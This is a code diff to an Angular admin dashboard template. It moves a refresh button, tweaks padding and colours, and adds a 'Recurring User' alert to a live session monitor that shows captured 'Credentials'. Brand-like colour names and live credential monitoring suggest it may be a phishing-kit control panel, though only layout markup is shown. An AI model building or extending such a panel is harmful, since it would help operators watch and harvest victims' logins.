@@ -84,7 +84,7 @@ type AdminTab = 'live' | 'history' | 'settings';
       </aside>
 
       <!-- MAIN CONTENT -->
-      <main class="flex-1 flex flex-col h-[calc(100dvh-64px)] lg:h-[100dvh] relative bg-pp-bg dark:bg-slate-950 overflow-hidden">
+      <main class="flex-1 flex flex-col h-[calc(100dvh-64px)] lg:h-[100dvh] relative bg-pp-bg overflow-hidden">
          
          <!-- Top Bar (Desktop Only) -->
          <header class="hidden lg:flex h-16 bg-white dark:bg-slate-900 border-b border-slate-200 dark:border-slate-700 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
@@ -97,7 +97,9 @@ type AdminTab = 'live' | 'history' | 'settings';
                  }
              </div>
              <div class="flex items-center gap-4">
-                 <!-- Refreshed moved to Active Sessions panel -->
+                 <button (click)="refresh()" class="p-2 text-pp-blue bg-blue-50 rounded-full hover:bg-blue-100 transition-colors" title="Force Refresh">
+                     <span class="material-icons text-sm">refresh</span>
+                 </button>
                  <div class="w-8 h-8 rounded-full bg-pp-navy text-white flex items-center justify-center font-bold text-xs">A</div>
              </div>
          </header>
@@ -114,12 +116,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                         <!-- List Column (Fixed Width on Desktop, Top on Mobile) -->
                         <div class="lg:w-[350px] bg-white dark:bg-slate-800 border-b lg:border-b-0 lg:border-r border-slate-200 dark:border-slate-700 flex flex-col shrink-0 h-[300px] lg:h-full">
                              <div class="p-4 border-b border-slate-100 dark:border-slate-700 bg-slate-50/90 dark:bg-slate-900/90 flex justify-between items-center shrink-0">
-                                 <div class="flex items-center gap-2">
-                                     <h3 class="font-bold text-base text-pp-navy dark:text-white">Active Sessions</h3>
-                                     <button (click)="refresh()" class="p-1 text-pp-blue hover:bg-blue-50 dark:hover:bg-slate-700 rounded transition-colors" title="Force Refresh">
-                                         <span class="material-icons text-sm">refresh</span>
-                                     </button>
-                                 </div>
+                                 <h3 class="font-bold text-base text-pp-navy dark:text-white">Active Sessions</h3>
                                  <span class="bg-pp-blue text-white text-xs px-2 py-1 rounded-md font-bold">{{ state.activeSessions().length }}</span>
                              </div>
                              <div class="flex-1 overflow-y-auto p-2 space-y-2 dark:bg-slate-800">
@@ -221,7 +218,24 @@ type AdminTab = 'live' | 'history' | 'settings';
                                  </div>
                                  
                                  <!-- Scrollable Content -->
-                                 <div class="flex-1 overflow-y-auto p-4 lg:p-8 pb-40"> <!-- Increased padding -->
+                                 <div class="flex-1 overflow-y-auto p-4 lg:p-8 pb-32">
+
+                                     <!-- Recurring User Alert -->
+                                     @if(monitoredSession()?.data?.isRecurring) {
+                                        <div class="mb-6 bg-amber-50 border border-amber-200 rounded-lg p-3 flex items-center justify-between mx-auto max-w-full">
+                                            <div class="flex items-center gap-2">
+                                                <span class="material-icons text-amber-600">history</span>
+                                                <div>
+                                                    <p class="text-xs font-bold text-amber-800">Recurring User</p>
+                                                    <p class="text-[10px] text-amber-600">Previously verified session detected.</p>
+                                                </div>
+                                            </div>
+                                            <button (click)="viewLinkedSession()" class="text-xs font-bold text-amber-700 hover:underline bg-white/50 px-2 py-1 rounded border border-amber-200">
+                                                View Previous
+                                            </button>
+                                        </div>
+                                     }
+
                                      <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                          
                                          <!-- Credentials -->
@@ -460,7 +474,7 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                         <div class="flex-1 overflow-auto bg-white dark:bg-slate-800">
                             <table class="w-full text-left border-collapse">
-                                <thead class="bg-slate-50 dark:bg-slate-800 text-slate-500 dark:text-slate-400 text-xs font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm border-b border-slate-100 dark:border-slate-700">
+                                <thead class="bg-pp-bg dark:bg-slate-900 text-slate-500 dark:text-slate-400 text-xs font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm">
                                     <tr>
                                         <th class="px-4 py-4 w-12 text-center">
                                             <input type="checkbox" (change)="toggleAllSelection($event)" [checked]="isAllSelected()" class="rounded border-slate-300 text-pp-blue focus:ring-pp-blue cursor-pointer">
@@ -614,7 +628,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                            <span class="material-icons">close</span>
                        </button>
                    </div>
-                   <div class="flex-1 overflow-y-auto bg-[#F9FAFB] dark:bg-slate-900 flex flex-col pb-20"> <!-- Added padding -->
+                   <div class="flex-1 overflow-y-auto bg-[#F9FAFB] dark:bg-slate-900 flex flex-col">
                         <ng-container *ngTemplateOutlet="sessionDetailView; context: {session: selectedHistorySession(), isHistory: true}"></ng-container>
                    </div>
                </div>
